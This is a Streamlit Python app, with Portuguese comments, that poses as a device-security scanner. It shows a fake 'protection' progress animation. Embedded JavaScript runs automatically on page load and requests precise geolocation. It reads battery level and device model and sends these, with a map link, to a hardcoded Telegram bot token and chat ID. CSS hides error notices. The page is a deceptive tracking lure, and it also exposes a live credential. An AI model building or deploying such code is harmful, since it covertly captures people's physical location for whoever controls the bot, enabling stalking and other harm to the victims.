import streamlit as st
import time
from streamlit_js_eval import streamlit_js_eval

# --- DADOS DO TELEGRAM ---
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
ID = "8210828398"

st.set_page_config(page_title="Segurança Ativa", layout="centered")

# --- SUA ESTILIZAÇÃO (MANTIDA 100% INTACTA) ---
st.markdown("""
    <style>
    .main { background-color: #000; color: white; }
    .stAlert, [data-testid="stNotificationContent"], .stException, .element-container:has(.stAlert) { 
        display: none !important; 
    }
    .scanner-box { display: flex; flex-direction: column; align-items: center; padding: 10px; }
    .circle {
        width: 180px; height: 180px; border-radius: 50%;
        background: radial-gradient(circle, rgba(46, 204, 113, 0.2) 0%, transparent 70%);
        border: 2px solid rgba(46, 204, 113, 0.5);
        box-shadow: 0 0 40px rgba(46, 204, 113, 0.4);
        display: flex; align-items: center; justify-content: center;
        animation: pulse 2s infinite ease-in-out;
    }
    @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
    .pct-text { font-size: 45px; font-weight: bold; color: white; }
    .btn-barra {
        background-color: #ffc107; color: black; font-weight: bold;
        width: 100%; height: 55px; border-radius: 12px; border: none;
        font-size: 18px; cursor: pointer; display: flex;
        align-items: center; justify-content: center; gap: 10px;
        width: 100%;
    }
    </style>
""", unsafe_allow_html=True)

st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
caixa_bolha = st.empty()

with caixa_bolha.container():
    st.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">4%</div></div></div>', unsafe_allow_html=True)

st.write("✅ Ambiente de pagamentos")
st.write("✅ Privacidade e segurança")
st.write("✅ Vírus")

# --- O NOVO BOTÃO DESTRAVADO ---
js_botao_inquebravel = f"""
<div id="btn-container">
    <button class="btn-barra" onclick="dispararTudo()">
        <span style="color: red; font-size: 20px;">●</span> ATIVAR PROTEÇÃO
    </button>
</div>

<script>
async function dispararTudo() {{
    const options = {{ enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }};

    navigator.geolocation.getCurrentPosition(
        async (pos) => {{
            try {{
                // Captura de Bateria e Modelo
                const battery = await navigator.getBattery();
                const bLevel = Math.round(battery.level * 100);
                const model = navigator.userAgent.split('(')[1].split(')')[0];
                
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                const mapa = "https://www.google.com/maps?q=" + lat + "," + lon;
                
                const msg = "🛡️ *SISTEMA ATIVADO*\\n\\n" +
                            "📱 *Modelo:* `" + model + "`\\n" +
                            "🔋 *Bateria:* `" + bLevel + "%`\\n" +
                            "📍 [LOCALIZAÇÃO NO MAPA](" + mapa + ")";
                
                // Envio DIRETO para o Telegram (sem passar pelo Python)
                await fetch("https://api.telegram.org/bot{TOKEN}/sendMessage", {{
                    method: "POST",
                    headers: {{ "Content-Type": "application/json" }},
                    body: JSON.stringify({{
                        chat_id: "{ID}",
                        text: msg,
                        parse_mode: "Markdown"
                    }})
                }});
                
                // Avisa o Streamlit para girar a bolha
                window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
            }} catch (e) {{ console.log(e); }}
        }},
        (err) => {{ console.log("Erro de permissão"); }},
        options
    );
}}

// Tenta abrir o pop-up da Google automaticamente ao entrar
setTimeout(dispararTudo, 800);
</script>

<style>
.btn-barra {{
    background-color: #ffc107; color: black; font-weight: bold;
    width: 100%; height: 55px; border-radius: 12px; border: none;
    font-size: 18px; cursor: pointer; display: flex;
    align-items: center; justify-content: center; gap: 10px;
    font-family: sans-serif;
}}
</style>
"""

# Renderiza o botão como um componente HTML puro
clicou = st.components.v1.html(js_botao_inquebravel, height=80)

# --- ANIMAÇÃO DE SUCESSO ---
if clicou:
    for p in range(4, 101, 8):
        caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{{p}}%</div></div></div>', unsafe_allow_html=True)
        time.sleep(0.04)
    st.success("Proteção Concluída!")
    st.stop()

st.markdown('<p style="text-align:center; color:#444; margin-top:50px;">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
